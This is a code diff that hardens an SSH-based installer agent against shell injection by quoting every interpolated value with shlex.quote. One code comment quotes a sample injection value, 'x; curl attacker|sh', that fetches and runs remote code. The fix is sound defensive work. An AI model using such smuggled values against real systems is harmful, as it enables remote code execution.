@@ -745,16 +745,29 @@ class InstallerAgent(Actor):
                 else:
                     self._log_remote(f"[{node_name}] aiomqtt installed into venv.")
 
-                # 5. Kill any existing instance with this node name
-                await self._ssh_run(
-                    conn, f"pkill -f 'remote_runner.py.*--name {node_name}' 2>/dev/null; true"
-                )
+                # 5. Kill any existing instance with this node name.
+                # The pattern is quoted as one argument rather than wrapped in
+                # literal quotes: a name containing a quote would otherwise end
+                # them and the rest would be read as more shell.
+                pattern = f"remote_runner.py.*--name {node_name}"
+                await self._ssh_run(conn, f"pkill -f {shlex.quote(pattern)} 2>/dev/null; true")
 
                 # 6. Start runner using venv python in the background
+                # ⚠ Every interpolated value is quoted. `broker` comes straight
+                # off the task payload with no validation, so `--broker` used to
+                # accept `x; curl attacker|sh` and run it on the node. `node_name`
+                # is checked by `deploy_name_error`, but that only forbids the
+                # MQTT topic characters `# + /` — a space, a `;` or a `$(…)` is a
+                # perfectly acceptable node name as far as it is concerned.
+                # `~` is left outside the quotes so the remote shell still
+                # expands it.
+                log_path = shlex.quote(f"{node_name}.log")
                 cmd = (
                     f"nohup ~/wactorz/venv/bin/python ~/wactorz/remote_runner.py "
-                    f"--broker {broker} --port {mqtt_port} --name {node_name} "
-                    f"> ~/wactorz/{node_name}.log 2>&1 &"
+                    f"--broker {shlex.quote(str(broker))} "
+                    f"--port {shlex.quote(str(mqtt_port))} "
+                    f"--name {shlex.quote(node_name)} "
+                    f"> ~/wactorz/{log_path} 2>&1 &"
                 )
                 await self._ssh_run(conn, cmd)
                 self._log_remote(f"[{node_name}] Runner started with venv python.")
